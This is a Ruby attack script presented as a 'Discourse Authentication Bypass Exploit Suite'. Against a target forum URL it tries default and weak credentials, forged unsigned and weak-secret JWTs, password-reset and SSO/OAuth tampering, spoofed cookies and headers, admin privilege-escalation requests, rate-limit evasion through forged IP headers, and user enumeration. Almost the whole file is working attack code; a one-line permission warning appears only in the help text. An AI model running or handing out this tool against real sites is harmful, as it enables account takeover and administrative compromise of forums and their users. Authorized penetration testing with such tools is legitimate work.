#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'digest'
require 'jwt'

class DiscourseAuthBypass
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nğŸ” Starting authentication bypass tests on #{@target_url}"
    puts "=" * 60
    
    # Basic authentication bypass
    test_default_credentials
    test_weak_passwords
    test_password_reset_bypass
    test_session_fixation
    
    # JWT and token bypass
    test_jwt_bypass
    test_api_key_bypass
    test_session_token_bypass
    
    # SSO and OAuth bypass
    test_sso_bypass
    test_oauth_bypass
    
    # Admin access bypass
    test_admin_bypass
    test_privilege_escalation
    
    # Cookie and header manipulation
    test_cookie_manipulation
    test_header_injection
    
    # Rate limiting bypass
    test_rate_limit_bypass
    
    # Account enumeration
    test_user_enumeration
    
    print_results
    save_results
    
    @results
  end
  
  def test_default_credentials
    puts "\n[*] Testing default credentials..."
    @results[:summary][:total_tests] += 1
    
    # Common default credentials
    default_creds = [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'password' },
      { username: 'admin', password: '123456' },
      { username: 'admin', password: 'admin123' },
      { username: 'administrator', password: 'administrator' },
      { username: 'root', password: 'root' },
      { username: 'discourse', password: 'discourse' },
      { username: 'test', password: 'test' },
      { username: 'demo', password: 'demo' },
      { username: 'guest', password: 'guest' }
    ]
    
    default_creds.each do |cred|
      if test_login(cred[:username], cred[:password])
        add_vulnerability({
          test_type: 'Default Credentials',
          endpoint: '/session',
          method: 'POST',
          payload: cred,
          severity: 'Critical',
          evidence: ['Successful login with default credentials'],
          description: "Default credentials found: #{cred[:username]}/#{cred[:password]}"
        })
      end
    end
  end
  
  def test_weak_passwords
    puts "\n[*] Testing weak password policies..."
    @results[:summary][:total_tests] += 1
    
    # Test user creation with weak passwords
    weak_passwords = [
      '123',
      'password',
      '123456',
      'qwerty',
      'abc123',
      'admin',
      'test',
      '111111',
      'password123',
      'admin123'
    ]
    
    weak_passwords.each do |password|
      if test_user_creation("testuser#{rand(1000)}", "test#{rand(1000)}@example.com", password)
        add_vulnerability({
          test_type: 'Weak Password Policy',
          endpoint: '/users',
          method: 'POST',
          payload: { password: password },
          severity: 'Medium',
          evidence: ['Weak password accepted'],
          description: "Weak password policy allows: #{password}"
        })
      end
    end
  end
  
  def test_password_reset_bypass
    puts "\n[*] Testing password reset bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test password reset token manipulation
    reset_tests = [
      { token: 'invalid_token', user: 'admin' },
      { token: '0', user: 'admin' },
      { token: '1', user: 'admin' },
      { token: 'null', user: 'admin' },
      { token: '', user: 'admin' },
      { token: 'a' * 32, user: 'admin' }
    ]
    
    reset_tests.each do |test|
      response = test_password_reset(test[:user], test[:token])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Password Reset Bypass',
          endpoint: '/users/password-reset',
          method: 'POST',
          payload: test,
          severity: 'High',
          evidence: ["Response code: #{response.code}"],
          description: 'Password reset bypass via token manipulation'
        })
      end
    end
  end
  
  def test_session_fixation
    puts "\n[*] Testing session fixation..."
    @results[:summary][:total_tests] += 1
    
    # Test if session ID changes after login
    initial_session = get_session_id
    
    if test_login('admin', 'password')
      post_login_session = get_session_id
      
      if initial_session && post_login_session && initial_session == post_login_session
        add_vulnerability({
          test_type: 'Session Fixation',
          endpoint: '/session',
          method: 'POST',
          payload: {},
          severity: 'High',
          evidence: ['Session ID not regenerated after login'],
          description: 'Session fixation vulnerability - session ID not changed after authentication'
        })
      end
    end
  end
  
  def test_jwt_bypass
    puts "\n[*] Testing JWT bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    # Test JWT manipulation
    jwt_tests = [
      create_unsigned_jwt,
      create_none_algorithm_jwt,
      create_weak_secret_jwt,
      create_modified_jwt
    ]
    
    jwt_tests.each do |jwt_token|
      next unless jwt_token
      
      response = test_jwt_access(jwt_token)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'JWT Bypass',
          endpoint: '/admin',
          method: 'GET',
          payload: { jwt: jwt_token[0..50] + '...' },
          severity: 'Critical',
          evidence: ["Response code: #{response.code}"],
          description: 'JWT bypass allows unauthorized access'
        })
      end
    end
  end
  
  def test_api_key_bypass
    puts "\n[*] Testing API key bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test API key manipulation
    api_key_tests = [
      'invalid_key',
      '0',
      '1',
      'null',
      '',
      'a' * 32,
      'admin',
      'test',
      Base64.encode64('admin').strip,
      Digest::MD5.hexdigest('admin')
    ]
    
    api_key_tests.each do |api_key|
      response = test_api_access(api_key)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'API Key Bypass',
          endpoint: '/admin/api',
          method: 'GET',
          payload: { api_key: api_key },
          severity: 'Critical',
          evidence: ["Response code: #{response.code}"],
          description: 'API key bypass allows unauthorized access'
        })
      end
    end
  end
  
  def test_session_token_bypass
    puts "\n[*] Testing session token bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test session token manipulation
    token_tests = [
      'invalid_token',
      '0',
      '1',
      'admin',
      'true',
      'false',
      Base64.encode64('admin').strip
    ]
    
    token_tests.each do |token|
      response = test_session_access(token)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Session Token Bypass',
          endpoint: '/admin',
          method: 'GET',
          payload: { token: token },
          severity: 'High',
          evidence: ["Response code: #{response.code}"],
          description: 'Session token bypass allows unauthorized access'
        })
      end
    end
  end
  
  def test_sso_bypass
    puts "\n[*] Testing SSO bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test SSO parameter manipulation
    sso_tests = [
      { sso: Base64.encode64('admin=true'), sig: 'invalid' },
      { sso: Base64.encode64('user_id=1'), sig: 'invalid' },
      { sso: Base64.encode64('email=admin@example.com'), sig: 'invalid' },
      { sso: 'invalid', sig: 'invalid' }
    ]
    
    sso_tests.each do |test|
      response = test_sso_login(test[:sso], test[:sig])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'SSO Bypass',
          endpoint: '/session/sso_login',
          method: 'GET',
          payload: test,
          severity: 'Critical',
          evidence: ["Response code: #{response.code}"],
          description: 'SSO bypass allows unauthorized authentication'
        })
      end
    end
  end
  
  def test_oauth_bypass
    puts "\n[*] Testing OAuth bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test OAuth parameter manipulation
    oauth_tests = [
      { code: 'invalid_code', state: 'admin' },
      { code: '0', state: 'admin' },
      { code: '1', state: 'admin' },
      { access_token: 'invalid_token' }
    ]
    
    oauth_tests.each do |test|
      response = test_oauth_callback(test)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'OAuth Bypass',
          endpoint: '/auth/oauth/callback',
          method: 'GET',
          payload: test,
          severity: 'High',
          evidence: ["Response code: #{response.code}"],
          description: 'OAuth bypass allows unauthorized authentication'
        })
      end
    end
  end
  
  def test_admin_bypass
    puts "\n[*] Testing admin access bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test direct admin access
    admin_endpoints = [
      '/admin',
      '/admin/users',
      '/admin/site_settings',
      '/admin/dashboard',
      '/admin/logs',
      '/admin/api',
      '/admin/customize',
      '/admin/plugins'
    ]
    
    admin_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400 && !response.body.include?('login')
        add_vulnerability({
          test_type: 'Admin Access Bypass',
          endpoint: endpoint,
          method: 'GET',
          payload: {},
          severity: 'Critical',
          evidence: ["Response code: #{response.code}", 'Admin access without authentication'],
          description: "Direct admin access possible: #{endpoint}"
        })
      end
    end
  end
  
  def test_privilege_escalation
    puts "\n[*] Testing privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test privilege escalation via parameter manipulation
    escalation_tests = [
      { endpoint: '/admin/users/1/grant_admin', method: 'PUT' },
      { endpoint: '/admin/users/1/grant_moderation', method: 'PUT' },
      { endpoint: '/users/1', method: 'PUT', data: { admin: true } },
      { endpoint: '/users/1', method: 'PUT', data: { moderator: true } },
      { endpoint: '/users/1', method: 'PUT', data: { trust_level: 4 } }
    ]
    
    escalation_tests.each do |test|
      response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data] || {},
          severity: 'Critical',
          evidence: ["Response code: #{response.code}"],
          description: 'Privilege escalation possible'
        })
      end
    end
  end
  
  def test_cookie_manipulation
    puts "\n[*] Testing cookie manipulation..."
    @results[:summary][:total_tests] += 1
    
    # Test cookie manipulation
    cookie_tests = [
      { name: '_discourse_session', value: 'admin' },
      { name: 'user_id', value: '1' },
      { name: 'admin', value: 'true' },
      { name: 'logged_in', value: 'true' },
      { name: 'auth_token', value: 'admin' }
    ]
    
    cookie_tests.each do |test|
      response = test_cookie_access(test[:name], test[:value])
      
      if response && response.code.to_i < 400 && !response.body.include?('login')
        add_vulnerability({
          test_type: 'Cookie Manipulation',
          endpoint: '/admin',
          method: 'GET',
          payload: test,
          severity: 'High',
          evidence: ["Response code: #{response.code}"],
          description: 'Cookie manipulation allows unauthorized access'
        })
      end
    end
  end
  
  def test_header_injection
    puts "\n[*] Testing header injection bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test header injection
    header_tests = [
      { 'X-User-Id' => '1' },
      { 'X-Admin' => 'true' },
      { 'X-Forwarded-User' => 'admin' },
      { 'X-Remote-User' => 'admin' },
      { 'X-Auth-User' => 'admin' },
      { 'Authorization' => 'Bearer admin' },
      { 'X-API-Key' => 'admin' }
    ]
    
    header_tests.each do |headers|
      response = test_header_access(headers)
      
      if response && response.code.to_i < 400 && !response.body.include?('login')
        add_vulnerability({
          test_type: 'Header Injection Bypass',
          endpoint: '/admin',
          method: 'GET',
          payload: headers,
          severity: 'High',
          evidence: ["Response code: #{response.code}"],
          description: 'Header injection allows unauthorized access'
        })
      end
    end
  end
  
  def test_rate_limit_bypass
    puts "\n[*] Testing rate limit bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test rate limit bypass techniques
    bypass_headers = [
      { 'X-Forwarded-For' => '127.0.0.1' },
      { 'X-Real-IP' => '127.0.0.1' },
      { 'X-Originating-IP' => '127.0.0.1' },
      { 'X-Remote-IP' => '127.0.0.1' },
      { 'X-Client-IP' => '127.0.0.1' }
    ]
    
    # Test multiple login attempts
    10.times do |i|
      bypass_headers.each do |headers|
        response = test_login_with_headers('admin', 'wrongpassword', headers)
        
        if response && !response.body.include?('rate limit') && !response.body.include?('too many')
          add_vulnerability({
            test_type: 'Rate Limit Bypass',
            endpoint: '/session',
            method: 'POST',
            payload: headers,
            severity: 'Medium',
            evidence: ['Rate limiting bypassed'],
            description: 'Rate limit bypass via header manipulation'
          })
          break
        end
      end
    end
  end
  
  def test_user_enumeration
    puts "\n[*] Testing user enumeration..."
    @results[:summary][:total_tests] += 1
    
    # Test user enumeration
    test_users = ['admin', 'administrator', 'test', 'user', 'demo']
    
    test_users.each do |username|
      # Test login response differences
      valid_response = test_login(username, 'validpassword')
      invalid_response = test_login('nonexistentuser12345', 'validpassword')
      
      if valid_response && invalid_response
        if valid_response.body != invalid_response.body || valid_response.code != invalid_response.code
          add_vulnerability({
            test_type: 'User Enumeration',
            endpoint: '/session',
            method: 'POST',
            payload: { username: username },
            severity: 'Low',
            evidence: ['Different responses for valid/invalid users'],
            description: 'User enumeration possible via login response differences'
          })
        end
      end
      
      # Test password reset enumeration
      reset_response = test_password_reset_request(username)
      if reset_response && reset_response.body.include?('sent') || reset_response.body.include?('email')
        add_vulnerability({
          test_type: 'User Enumeration',
          endpoint: '/users/password-reset',
          method: 'POST',
          payload: { username: username },
          severity: 'Low',
          evidence: ['Password reset reveals user existence'],
          description: 'User enumeration via password reset'
        })
      end
    end
  end
  
  # Helper methods
  def test_login(username, password)
    data = {
      login: username,
      password: password
    }
    
    make_post_request("#{@target_url}/session", data)
  end
  
  def test_user_creation(username, email, password)
    data = {
      name: username,
      username: username,
      email: email,
      password: password
    }
    
    response = make_post_request("#{@target_url}/users", data)
    response && response.code.to_i < 400
  end
  
  def test_password_reset(username, token)
    data = {
      username: username,
      token: token,
      password: 'newpassword123'
    }
    
    make_post_request("#{@target_url}/users/password-reset/#{token}", data)
  end
  
  def test_password_reset_request(username)
    data = { login: username }
    make_post_request("#{@target_url}/users/password-reset", data)
  end
  
  def get_session_id
    response = make_request(URI("#{@target_url}/"), 'GET')
    return nil unless response && response['Set-Cookie']
    
    if match = response['Set-Cookie'].match(/_discourse_session=([^;]+)/)
      return match[1]
    end
    
    nil
  end
  
  def create_unsigned_jwt
    begin
      payload = {
        user_id: 1,
        username: 'admin',
        admin: true,
        exp: Time.now.to_i + 3600
      }
      
      # Create unsigned JWT (algorithm: none)
      header = { alg: 'none', typ: 'JWT' }
      
      encoded_header = Base64.urlsafe_encode64(header.to_json).gsub('=', '')
      encoded_payload = Base64.urlsafe_encode64(payload.to_json).gsub('=', '')
      
      "#{encoded_header}.#{encoded_payload}."
    rescue
      nil
    end
  end
  
  def create_none_algorithm_jwt
    begin
      payload = {
        user_id: 1,
        username: 'admin',
        admin: true,
        exp: Time.now.to_i + 3600
      }
      
      JWT.encode(payload, nil, 'none')
    rescue
      nil
    end
  end
  
  def create_weak_secret_jwt
    begin
      payload = {
        user_id: 1,
        username: 'admin',
        admin: true,
        exp: Time.now.to_i + 3600
      }
      
      # Try common weak secrets
      weak_secrets = ['secret', 'key', 'admin', 'password', '123456']
      
      weak_secrets.each do |secret|
        begin
          return JWT.encode(payload, secret, 'HS256')
        rescue
          next
        end
      end
      
      nil
    rescue
      nil
    end
  end
  
  def create_modified_jwt
    begin
      # Get a valid JWT first (if possible)
      response = make_request(URI("#{@target_url}/session/current.json"), 'GET')
      return nil unless response && response.body
      
      # Try to extract JWT from response
      if match = response.body.match(/"token"\s*:\s*"([^"]+)"/)
        original_jwt = match[1]
        
        # Decode and modify
        decoded = JWT.decode(original_jwt, nil, false)
        payload = decoded[0]
        
        # Modify payload
        payload['admin'] = true
        payload['user_id'] = 1
        
        # Re-encode without verification
        JWT.encode(payload, 'modified_secret', 'HS256')
      end
    rescue
      nil
    end
  end
  
  def test_jwt_access(jwt_token)
    headers = { 'Authorization' => "Bearer #{jwt_token}" }
    make_request_with_headers("#{@target_url}/admin", 'GET', headers)
  end
  
  def test_api_access(api_key)
    headers = { 'Api-Key' => api_key }
    make_request_with_headers("#{@target_url}/admin/api", 'GET', headers)
  end
  
  def test_session_access(token)
    headers = { 'X-Auth-Token' => token }
    make_request_with_headers("#{@target_url}/admin", 'GET', headers)
  end
  
  def test_sso_login(sso, sig)
    params = "sso=#{CGI.escape(sso)}&sig=#{CGI.escape(sig)}"
    make_request(URI("#{@target_url}/session/sso_login?#{params}"), 'GET')
  end
  
  def test_oauth_callback(params)
    query_string = URI.encode_www_form(params)
    make_request(URI("#{@target_url}/auth/oauth/callback?#{query_string}"), 'GET')
  end
  
  def test_cookie_access(name, value)
    headers = { 'Cookie' => "#{name}=#{value}" }
    make_request_with_headers("#{@target_url}/admin", 'GET', headers)
  end
  
  def test_header_access(headers)
    make_request_with_headers("#{@target_url}/admin", 'GET', headers)
  end
  
  def test_login_with_headers(username, password, headers)
    data = {
      login: username,
      password: password
    }
    
    uri = URI("#{@target_url}/session")
    body = URI.encode_www_form(data)
    
    default_headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(uri, 'POST', body, default_headers.merge(headers))
  end
  
  def make_request_with_data(endpoint, method, data = nil)
    uri = URI("#{@target_url}#{endpoint}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(uri, method, body, headers)
  end
  
  def make_request_with_headers(url, method, headers)
    uri = URI(url)
    make_request(uri, method, nil, headers)
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    end
    
    puts "  âœ“ #{vuln_data[:severity]} auth bypass: #{vuln_data[:test_type]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE AUTHENTICATION BYPASS TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_auth_bypass_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse Authentication Bypass Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_auth_bypass.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_auth_bypass.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseAuthBypass.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nğŸš¨ CRITICAL: Authentication bypass vulnerabilities found!"
      puts "   Unauthorized access and privilege escalation possible!"
    else
      puts "\nâœ… No authentication bypass vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end